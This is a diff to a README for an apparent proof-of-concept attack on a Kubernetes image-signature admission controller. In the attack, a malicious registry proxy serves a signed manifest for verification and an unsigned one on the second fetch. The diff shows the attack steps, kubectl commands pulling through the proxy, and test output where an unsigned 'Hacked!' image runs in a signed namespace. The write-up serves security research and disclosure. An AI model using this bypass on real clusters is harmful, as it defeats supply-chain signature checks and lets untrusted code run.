@@ -55,16 +55,15 @@ The proxy server behaves in the following way: if it sees that the Admission Con
 ![Image validation in admission controller](docs/dia2.png "Title")
 
 The attack steps are as follows:
-1. The user is convinced to run the signed image from the “Malicious proxy”
-2. kubectl -n signed run unsigned --image=10.0.2.15:4443/hisu/cosign-tests:signed --image-pull-policy='Always'
-3. API server asks the admission controller for approval
-4. The Admission Controller asks for the image manifest and signature from the “signed image”
-5. The malicious proxy returns the “signed image” to the Admission Controller
-6. The Admission Controller verifies the signature of the signed image
-7. The Admission Controller request the manifest of the signed image for the second time to get the digest for mutation
-8. The malicious proxy returns the manifest of the unsigned image
-9. The Admission Controller mutates the image in the Pod spec based on the manifest in step 8 and gives approval to the API server
-10. Kubelet is asked to start the POD
+1. The user is convinced to run the signed image from the “Malicious proxy” && kubectl -n signed run unsigned --image=10.0.2.15:4443/hisu/cosign-tests:signed --image-pull-policy='Always'
+2. API server asks the admission controller for approval
+3. The Admission Controller asks for the image manifest and signature from the “signed image”
+4. The malicious proxy returns the “signed image” to the Admission Controller
+5. The Admission Controller verifies the signature of the signed image
+6. The Admission Controller request the manifest of the signed image for the second time to get the digest for mutation
+7. The malicious proxy returns the manifest of the unsigned image
+8. The Admission Controller mutates the image in the Pod spec based on the manifest in step 7 and gives approval to the API server
+9. Kubelet is asked to start the POD
 
 **The container is started based on the unsigned image**
 
@@ -140,7 +139,7 @@ Let's bring up the malicious proxy. I have created a simple script to create sig
 
 You can run also the following script to run through all the positive and negative cases:
 ```shell{:copy}
-$ ./running-attack-tests.sh <IP>
+$ ./running-attack-tests.sh <MY IP>
 1> Trying to run unsigned image in signed namespace
 ----------------------------------------
 kubectl -n signed run unsigned --image=hisu/cosign-tests:unsigned --image-pull-policy=Always
@@ -160,17 +159,27 @@ pod/signed created
 ----------------------------------------
 2> Succeeded to run signed image in signed namespace
 Press enter to continue
-3> Trying to run unsigned image in signed namespace by using the proxy
+3> Trying to run signed image in signed namespace by using the proxy
 ----------------------------------------
-kubectl -n signed run unsigned --image=10.100.102.57:4443/hisu/cosign-tests:unsigned --image-pull-policy=Always
+kubectl -n signed run unsigned --image=10.144.94.202:4443/hisu/cosign-tests:signed --image-pull-policy=Always
 pod/unsigned created
 ----------------------------------------
+3> Waiting for pod to be ready
+pod/unsigned condition met
+3> Checking HTTP response from the pod
+----------------------------------------
+Forwarding from 127.0.0.1:8080 -> 80
+Forwarding from [::1]:8080 -> 80
+curl -s -k -v http://localhost:8080
+*   Trying 127.0.0.1:8080...
+<h1>Hacked!</h1>
  ___ _   _  ___ ___ ___  ___ ___ 
 / __| | | |/ __/ __/ _ \/ __/ __|
 \__ \ |_| | (_| (_|  __/\__ \__ \
 |___/\__,_|\___\___\___||___/___/
 
-3> Succeeded to run unsigned image in signed namespace by using the proxy
+3> Proxy could inject an unsigned image in signed namespace
+----------------------------------------
 Press enter to continue
 pod "unsigned" deleted
 pod "signed" deleted
